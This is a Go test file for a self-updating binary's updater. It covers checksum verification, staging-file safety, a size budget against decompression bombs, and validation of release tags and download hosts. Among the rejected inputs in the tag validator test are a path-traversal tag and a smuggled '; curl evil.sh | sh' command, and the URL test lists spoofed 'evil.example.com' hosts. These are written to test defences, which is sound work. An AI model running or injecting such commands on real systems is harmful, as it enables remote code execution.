package updater

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// fakeRelease serves a releases/latest payload whose asset matrix matches the
// running GOOS/GOARCH, plus a checksums.txt entry, and rewires the release API
// seam at it for the duration of the test.
func fakeRelease(t *testing.T, version string) (assetName string) {
	t.Helper()
	assetName = fmt.Sprintf("anchored_%s_%s_%s.tar.gz", version, runtime.GOOS, runtime.GOARCH)

	mux := http.NewServeMux()
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	mux.HandleFunc("/checksums.txt", func(w http.ResponseWriter, r *http.Request) {
		if _, err := fmt.Fprintf(w, "%s  %s\n", strings.Repeat("a", 64), assetName); err != nil {
			t.Errorf("write checksums: %v", err)
		}
	})
	mux.HandleFunc("/release", func(w http.ResponseWriter, r *http.Request) {
		payload := map[string]any{
			"tag_name": "v" + version,
			"assets": []map[string]string{
				{"name": assetName, "browser_download_url": srv.URL + "/" + assetName},
				{"name": "checksums.txt", "browser_download_url": srv.URL + "/checksums.txt"},
			},
		}
		if err := json.NewEncoder(w).Encode(payload); err != nil {
			t.Errorf("encode release: %v", err)
		}
	})

	orig := releaseAPIURL
	releaseAPIURL = srv.URL + "/release?repo=%s"
	t.Cleanup(func() { releaseAPIURL = orig })
	return assetName
}

// canonicalBin returns a path inside a fake $HOME that satisfies Check's
// canonical-directory guard.
func canonicalBin(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	dir := filepath.Join(home, ".anchored", "bin")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	return filepath.Join(dir, "anchored")
}

func TestCheck_BlockedNoVersion(t *testing.T) {
	res, err := Check(context.Background(), Options{BinPath: canonicalBin(t)})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockNoVersion {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockNoVersion)
	}
}

func TestCheck_BlockedEnvDisabled(t *testing.T) {
	t.Setenv("ANCHORED_NO_AUTOUPDATE", "1")
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0",
		BinPath:        canonicalBin(t),
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockEnvDisabled {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockEnvDisabled)
	}
}

func TestCheck_BlockedDevBuild(t *testing.T) {
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0-dev+gc1d9b3c",
		BinPath:        canonicalBin(t),
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockDevBuild {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockDevBuild)
	}
	// A local guard must short-circuit before any network call, so the
	// background path stays offline on a developer's machine.
	if res.Latest != "" {
		t.Fatalf("Latest = %q, want empty without AlwaysResolve", res.Latest)
	}
}

func TestCheck_BlockedOutsideCanonicalDir(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0",
		BinPath:        filepath.Join("/usr", "local", "bin", "anchored"),
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockOutsideCanonical {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockOutsideCanonical)
	}
}

func TestCheck_BlockedNotNewer(t *testing.T) {
	fakeRelease(t, "0.18.0")
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.18.0",
		BinPath:        canonicalBin(t),
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockNotNewer {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockNotNewer)
	}
	// not-newer is decided after the release resolves, so the numbers a
	// caller would report are present even though the update is refused.
	if res.Latest != "0.18.0" {
		t.Fatalf("Latest = %q, want 0.18.0", res.Latest)
	}
}

func TestCheck_UpdateAvailable(t *testing.T) {
	assetName := fakeRelease(t, "0.18.0")
	bin := canonicalBin(t)
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0",
		BinPath:        bin,
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockNone {
		t.Fatalf("Blocked = %q, want none", res.Blocked)
	}
	if !res.Newer {
		t.Fatal("Newer = false, want true")
	}
	if res.Latest != "0.18.0" || res.Current != "0.17.0" {
		t.Fatalf("versions = %q → %q, want 0.17.0 → 0.18.0", res.Current, res.Latest)
	}
	if res.AssetName != assetName {
		t.Fatalf("AssetName = %q, want %q", res.AssetName, assetName)
	}
	if res.AssetURL == "" || res.ChecksumsURL == "" {
		t.Fatalf("asset/checksums URL empty: %+v", res)
	}
	if res.BinPath != bin {
		t.Fatalf("BinPath = %q, want %q", res.BinPath, bin)
	}
}

// AlwaysResolve is what lets an interactive caller report "you are on a dev
// build AND 0.18.0 is out" in one line, instead of one or the other.
func TestCheck_AlwaysResolveReportsLatestWhenBlocked(t *testing.T) {
	fakeRelease(t, "0.18.0")
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0-dev+gc1d9b3c",
		BinPath:        canonicalBin(t),
		AlwaysResolve:  true,
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockDevBuild {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockDevBuild)
	}
	if res.Latest != "0.18.0" {
		t.Fatalf("Latest = %q, want 0.18.0", res.Latest)
	}
	if res.AssetURL == "" {
		t.Fatal("AssetURL empty: a forcing caller needs it to install anyway")
	}
}

func TestCheck_ResolveErrorPropagates(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusForbidden)
	}))
	defer srv.Close()
	orig := releaseAPIURL
	releaseAPIURL = srv.URL + "?repo=%s"
	defer func() { releaseAPIURL = orig }()

	_, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0",
		BinPath:        canonicalBin(t),
	})
	if err == nil {
		t.Fatal("expected an error, got nil")
	}
	if !strings.Contains(err.Error(), "403") {
		t.Fatalf("error should name the HTTP status, got %v", err)
	}
}

func TestCheck_ResolvesBinPathWhenEmpty(t *testing.T) {
	res, err := Check(context.Background(), Options{CurrentVersion: ""})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	// no-version short-circuits before path resolution; the point here is
	// that an empty BinPath is not itself an error.
	if res.Blocked != BlockNoVersion {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockNoVersion)
	}
}

func TestApply_ChecksumLookupFailureIsDistinguishable(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer srv.Close()

	err := Apply(context.Background(), Result{
		BinPath:      filepath.Join(t.TempDir(), "anchored"),
		AssetURL:     srv.URL + "/asset.tar.gz",
		AssetName:    "asset.tar.gz",
		ChecksumsURL: srv.URL + "/checksums.txt",
	})
	if err == nil {
		t.Fatal("expected an error, got nil")
	}
	// Run logs a different line for "could not verify" than for "install
	// failed"; the sentinel is what keeps those two apart.
	if !errors.Is(err, ErrChecksumLookup) {
		t.Fatalf("expected a checksum-lookup error, got %v", err)
	}
}

func TestApply_InstallsVerifiedPayload(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "anchored")
	if err := os.WriteFile(dst, []byte("OLD"), 0o755); err != nil {
		t.Fatal(err)
	}

	tarball, sum := makeTarGz(t, []byte("NEW-BINARY"))
	mux := http.NewServeMux()
	mux.HandleFunc("/asset.tar.gz", func(w http.ResponseWriter, r *http.Request) {
		if _, err := w.Write(tarball); err != nil {
			t.Errorf("write tarball: %v", err)
		}
	})
	mux.HandleFunc("/checksums.txt", func(w http.ResponseWriter, r *http.Request) {
		if _, err := fmt.Fprintf(w, "%s  asset.tar.gz\n", sum); err != nil {
			t.Errorf("write checksums: %v", err)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	err := Apply(context.Background(), Result{
		BinPath:      dst,
		AssetURL:     srv.URL + "/asset.tar.gz",
		AssetName:    "asset.tar.gz",
		ChecksumsURL: srv.URL + "/checksums.txt",
	})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	got, _ := os.ReadFile(dst)
	if string(got) != "NEW-BINARY" {
		t.Fatalf("dst = %q, want NEW-BINARY", got)
	}
}

func TestApply_RequiresResolvedResult(t *testing.T) {
	err := Apply(context.Background(), Result{BinPath: "/tmp/anchored"})
	if err == nil {
		t.Fatal("expected an error for an unresolved Result, got nil")
	}
}

func TestCheck_ExecutableResolutionFailurePropagates(t *testing.T) {
	orig := osExecutable
	osExecutable = func() (string, error) { return "", errors.New("boom") }
	defer func() { osExecutable = orig }()

	_, err := Check(context.Background(), Options{CurrentVersion: "0.17.0"})
	if !errors.Is(err, ErrResolveExecutable) {
		t.Fatalf("want ErrResolveExecutable, got %v", err)
	}
}

// A binary built without ldflags reports no version. The background path
// stops there, but an explicit request must still be able to reach the
// release and install over it.
func TestCheck_AlwaysResolveWorksWithoutACurrentVersion(t *testing.T) {
	fakeRelease(t, "0.18.0")
	res, err := Check(context.Background(), Options{
		BinPath:       canonicalBin(t),
		AlwaysResolve: true,
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockNoVersion {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockNoVersion)
	}
	if res.Latest != "0.18.0" || res.AssetURL == "" {
		t.Fatalf("release not resolved: %+v", res)
	}
}

// fakeTagRelease serves releases/tags/{tag} for one known tag and 404s for
// anything else, so the "tag does not exist" path is exercised for real.
func fakeTagRelease(t *testing.T, knownTag, version string) {
	t.Helper()
	assetName := fmt.Sprintf("anchored_%s_%s_%s.tar.gz", version, runtime.GOOS, runtime.GOARCH)
	mux := http.NewServeMux()
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)

	mux.HandleFunc("/tags/", func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasSuffix(r.URL.Path, "/"+knownTag) {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		payload := map[string]any{
			"tag_name": knownTag,
			"assets": []map[string]string{
				{"name": assetName, "browser_download_url": srv.URL + "/" + assetName},
				{"name": "checksums.txt", "browser_download_url": srv.URL + "/checksums.txt"},
			},
		}
		if err := json.NewEncoder(w).Encode(payload); err != nil {
			t.Errorf("encode release: %v", err)
		}
	})

	orig := releaseTagAPIURL
	releaseTagAPIURL = srv.URL + "/tags/%[2]s?repo=%[1]s"
	t.Cleanup(func() { releaseTagAPIURL = orig })
}

func TestCheck_ResolvesAnExplicitTag(t *testing.T) {
	fakeTagRelease(t, "v0.17.0", "0.17.0")
	for _, given := range []string{"v0.17.0", "0.17.0"} {
		res, err := Check(context.Background(), Options{
			CurrentVersion: "0.16.0",
			BinPath:        canonicalBin(t),
			TargetVersion:  given,
		})
		if err != nil {
			t.Fatalf("%s: unexpected err: %v", given, err)
		}
		if res.Latest != "0.17.0" {
			t.Errorf("%s: Latest = %q, want 0.17.0", given, res.Latest)
		}
		if res.Blocked != BlockNone {
			t.Errorf("%s: Blocked = %q, want none", given, res.Blocked)
		}
	}
}

// "no asset for linux/amd64" is what a missing tag used to look like; the
// error has to name the tag instead.
func TestCheck_MissingTagNamesTheTag(t *testing.T) {
	fakeTagRelease(t, "v0.17.0", "0.17.0")
	_, err := Check(context.Background(), Options{
		CurrentVersion: "0.16.0",
		BinPath:        canonicalBin(t),
		TargetVersion:  "v9.9.9",
	})
	if err == nil {
		t.Fatal("expected an error for a tag that does not exist")
	}
	if !strings.Contains(err.Error(), "v9.9.9") {
		t.Fatalf("error should name the tag, got %v", err)
	}
}

// A downgrade lands on not-newer, which is exactly the refusal --force
// overrides — no separate guard needed.
func TestCheck_OlderTagIsRefusedAsNotNewer(t *testing.T) {
	fakeTagRelease(t, "v0.17.0", "0.17.0")
	res, err := Check(context.Background(), Options{
		CurrentVersion: "0.18.0",
		BinPath:        canonicalBin(t),
		TargetVersion:  "v0.17.0",
	})
	if err != nil {
		t.Fatalf("unexpected err: %v", err)
	}
	if res.Blocked != BlockNotNewer {
		t.Fatalf("Blocked = %q, want %q", res.Blocked, BlockNotNewer)
	}
	if res.AssetURL == "" {
		t.Fatal("assets must still resolve so --force can install the downgrade")
	}
}

// The staging file becomes the installed binary via rename, so whoever owns it
// owns what the machine runs next. A unique name per call is what rules out a
// planted file keeping its owner, a symlink being written through, and a
// second updater publishing this call's rename.
func TestCreateStagingFile_NameIsUniquePerCall(t *testing.T) {
	dir := t.TempDir()

	a, err := createStagingFile(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer closeStaging(t, a)
	b, err := createStagingFile(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer closeStaging(t, b)

	if a.Name() == b.Name() {
		t.Fatalf("two concurrent updaters got the same staging path: %s", a.Name())
	}
}

// A pre-existing file at a name the updater might have used is irrelevant now,
// but the property that matters is that createStagingFile never adopts one.
func TestCreateStagingFile_NeverAdoptsAnExistingFile(t *testing.T) {
	dir := t.TempDir()
	planted := filepath.Join(dir, "anchored.new")
	if err := os.WriteFile(planted, []byte("PLANTED"), 0o666); err != nil {
		t.Fatal(err)
	}

	f, err := createStagingFile(dir)
	if err != nil {
		t.Fatal(err)
	}
	defer closeStaging(t, f)

	if f.Name() == planted {
		t.Fatal("adopted the planted file")
	}
	if got, _ := os.ReadFile(planted); string(got) != "PLANTED" {
		t.Errorf("the planted file was disturbed: %q", got)
	}
	fi, err := os.Stat(f.Name())
	if err != nil {
		t.Fatal(err)
	}
	if fi.Size() != 0 {
		t.Errorf("staging file is not empty: %d bytes", fi.Size())
	}
	if perm := fi.Mode().Perm(); perm != 0o755 {
		t.Errorf("mode = %04o, want 0755 — an inherited 0666 would leave the installed binary writable", perm)
	}
}

func closeStaging(t *testing.T, f *os.File) {
	t.Helper()
	if err := f.Close(); err != nil {
		t.Errorf("close staging file: %v", err)
	}
}

// The payload is written to disk BEFORE the digest is checked, so the size an
// attacker declares in the tar header has to be bounded on its own. Without
// this, a few-MB gzip of zeroes writes hundreds of GB — and it needs no user
// present, since serve starts the updater on every MCP launch.
func TestDownloadAndReplace_RejectsAnOversizePayload(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "anchored")
	if err := os.WriteFile(dst, []byte("OLD"), 0o755); err != nil {
		t.Fatal(err)
	}

	tarball, sum := makeTarGz(t, bytes.Repeat([]byte{0}, 4096))
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if _, err := w.Write(tarball); err != nil {
			t.Errorf("write tarball: %v", err)
		}
	}))
	defer srv.Close()

	// The ceiling is injected rather than mutated: it is a security bound, so
	// production code holds it as a const.
	err := downloadAndReplaceLimited(context.Background(), srv.URL, dst, sum, 64)
	if err == nil {
		t.Fatal("an oversize payload must be rejected")
	}
	if !strings.Contains(err.Error(), "budget") {
		t.Errorf("error should name the budget, got %v", err)
	}
	if got, _ := os.ReadFile(dst); string(got) != "OLD" {
		t.Errorf("the installed binary was touched: %q", got)
	}
	leaked, _ := filepath.Glob(filepath.Join(dir, ".anchored-new-*"))
	if len(leaked) != 0 {
		t.Errorf("staging file leaked after rejection: %v", leaked)
	}
}

// A decoy entry named anything but "anchored" is still inflated in full by
// tar.Next, so the budget has to be charged before the name filter.
func TestDownloadAndReplace_ChargesSkippedEntriesToTheBudget(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "anchored")

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	decoy := bytes.Repeat([]byte{0}, 4096)
	if err := tw.WriteHeader(&tar.Header{Name: "decoy", Mode: 0o644, Size: int64(len(decoy)), Typeflag: tar.TypeReg}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(decoy); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(buf.Bytes())

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if _, err := w.Write(buf.Bytes()); err != nil {
			t.Errorf("write tarball: %v", err)
		}
	}))
	defer srv.Close()

	err := downloadAndReplaceLimited(context.Background(), srv.URL, dst, hex.EncodeToString(sum[:]), 64)
	if err == nil {
		t.Fatal("a decoy entry over the budget must be rejected")
	}
	if !strings.Contains(err.Error(), "decoy") {
		t.Errorf("error should name the offending entry, got %v", err)
	}
}

// The old code renamed dst to .prev and then renamed the new binary in,
// leaving a window with nothing at dst. MCP clients spawn `anchored serve` on
// demand, so a spawn landing in that window got ENOENT. A hardlink backup
// keeps dst present throughout.
func TestDownloadAndReplace_BackupIsAHardlinkSoDstNeverDisappears(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "anchored")
	if err := os.WriteFile(dst, []byte("OLD"), 0o755); err != nil {
		t.Fatal(err)
	}
	oldStat, err := os.Stat(dst)
	if err != nil {
		t.Fatal(err)
	}

	tarball, sum := makeTarGz(t, []byte("NEW-BINARY"))
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if _, err := w.Write(tarball); err != nil {
			t.Errorf("write tarball: %v", err)
		}
	}))
	defer srv.Close()

	if err := downloadAndReplace(context.Background(), srv.URL, dst, sum); err != nil {
		t.Fatal(err)
	}

	prevStat, err := os.Stat(dst + ".prev")
	if err != nil {
		t.Fatalf("expected a .prev backup: %v", err)
	}
	if !os.SameFile(oldStat, prevStat) {
		t.Error(".prev should be another name for the original inode")
	}
	if got, _ := os.ReadFile(dst); string(got) != "NEW-BINARY" {
		t.Errorf("dst = %q", got)
	}
}

// A .prev from an earlier update holds an older binary. A failed install must
// not promote it — that turns a failure into a silent downgrade.
func TestDownloadAndReplace_StalePrevIsNotPromotedOnAFreshInstall(t *testing.T) {
	dir := t.TempDir()
	dst := filepath.Join(dir, "anchored")
	// No dst: a fresh install. But a .prev is lying around from before.
	if err := os.WriteFile(dst+".prev", []byte("ANCIENT"), 0o755); err != nil {
		t.Fatal(err)
	}

	tarball, _ := makeTarGz(t, []byte("NEW-BINARY"))
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if _, err := w.Write(tarball); err != nil {
			t.Errorf("write tarball: %v", err)
		}
	}))
	defer srv.Close()

	// Wrong digest, so the install fails before the swap.
	err := downloadAndReplace(context.Background(), srv.URL, dst, strings.Repeat("0", 64))
	if err == nil {
		t.Fatal("expected the checksum to be rejected")
	}
	if _, err := os.Stat(dst); err == nil {
		t.Error("a failed install must not create dst from a stale .prev")
	}
	if got, _ := os.ReadFile(dst + ".prev"); string(got) != "ANCIENT" {
		t.Errorf(".prev was disturbed: %q", got)
	}
}

// The tag becomes a URL path segment and Go does not normalize dot-segments,
// so the shape has to be validated here rather than trusted to whatever the
// server does with it.
func TestReleaseTag_RejectsAnythingThatIsNotAVersion(t *testing.T) {
	for _, ok := range []string{"0.17.0", "v0.17.0", "1.2.3-rc.1", "v10.20.30"} {
		got, err := releaseTag(ok)
		if err != nil {
			t.Errorf("releaseTag(%q) errored: %v", ok, err)
		}
		if !strings.HasPrefix(got, "v") {
			t.Errorf("releaseTag(%q) = %q, want a v prefix", ok, got)
		}
	}
	for _, bad := range []string{
		"../../attacker/evil/releases/latest",
		"v../../attacker/evil",
		"0.1.0?per_page=1",
		"0.1.0#frag",
		"0.17.1; curl evil.sh | sh",
		"latest",
		"",
	} {
		if bad == "" {
			continue // empty means "latest release", handled separately
		}
		if _, err := releaseTag(bad); err == nil {
			t.Errorf("releaseTag(%q) should have been rejected", bad)
		}
	}
	if got, err := releaseTag(""); err != nil || got != "" {
		t.Errorf(`releaseTag("") = %q, %v — empty must mean "latest"`, got, err)
	}
}

func TestCheck_RejectsAHostileTargetBeforeAnyRequest(t *testing.T) {
	var requests int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests++
	}))
	defer srv.Close()
	orig := releaseTagAPIURL
	releaseTagAPIURL = srv.URL + "/tags/%[2]s?repo=%[1]s"
	defer func() { releaseTagAPIURL = orig }()

	_, err := Check(context.Background(), Options{
		CurrentVersion: "0.17.0",
		BinPath:        canonicalBin(t),
		TargetVersion:  "../../attacker/evil/releases/latest",
	})
	if err == nil {
		t.Fatal("expected the target to be rejected")
	}
	if requests != 0 {
		t.Errorf("a rejected target must not reach the network, got %d requests", requests)
	}
}

// browser_download_url comes from the release document, so a tampered or
// proxied response could move the fetch to plaintext. The digest cannot catch
// it: checksums.txt comes from the same document.
func TestAssertTrustedDownloadURL(t *testing.T) {
	origA, origT := releaseAPIURL, releaseTagAPIURL
	releaseAPIURL = "https://api.github.com/repos/%s/releases/latest"
	releaseTagAPIURL = "https://api.github.com/repos/%s/releases/tags/%s"
	t.Cleanup(func() { releaseAPIURL, releaseTagAPIURL = origA, origT })

	for _, ok := range []string{
		"https://github.com/o/r/releases/download/v1.0.0/a.tar.gz",
		"https://objects.githubusercontent.com/x",
		"https://release-assets.githubusercontent.com/y",
	} {
		if err := assertTrustedDownloadURL(ok); err != nil {
			t.Errorf("%s should be accepted: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"http://github.com/o/r/releases/download/v1.0.0/a.tar.gz",
		"https://evil.example.com/a.tar.gz",
		"https://github.com.evil.example.com/a.tar.gz",
		"ftp://github.com/a",
	} {
		if err := assertTrustedDownloadURL(bad); err == nil {
			t.Errorf("%s should be refused", bad)
		}
	}
}

// The windows release publishes a zip, not a tar.gz. A tar-only asset lookup
// meant self-update reported "no archive for windows/amd64" and stopped.
func TestFetchRelease_AcceptsAZipAsset(t *testing.T) {
	assetName := fmt.Sprintf("anchored_0.19.0_%s_%s.zip", runtime.GOOS, runtime.GOARCH)
	mux := http.NewServeMux()
	srv := httptest.NewServer(mux)
	defer srv.Close()
	mux.HandleFunc("/release", func(w http.ResponseWriter, r *http.Request) {
		payload := map[string]any{
			"tag_name": "v0.19.0",
			"assets": []map[string]string{
				{"name": assetName, "browser_download_url": srv.URL + "/" + assetName},
				{"name": "checksums.txt", "browser_download_url": srv.URL + "/checksums.txt"},
			},
		}
		if err := json.NewEncoder(w).Encode(payload); err != nil {
			t.Errorf("encode: %v", err)
		}
	})
	orig := releaseAPIURL
	releaseAPIURL = srv.URL + "/release?repo=%s"
	defer func() { releaseAPIURL = orig }()

	_, url, name, _, err := fetchRelease(context.Background(), "o/r", "")
	if err != nil {
		t.Fatalf("a zip asset must resolve: %v", err)
	}
	if name != assetName || url == "" {
		t.Fatalf("name=%q url=%q", name, url)
	}
}
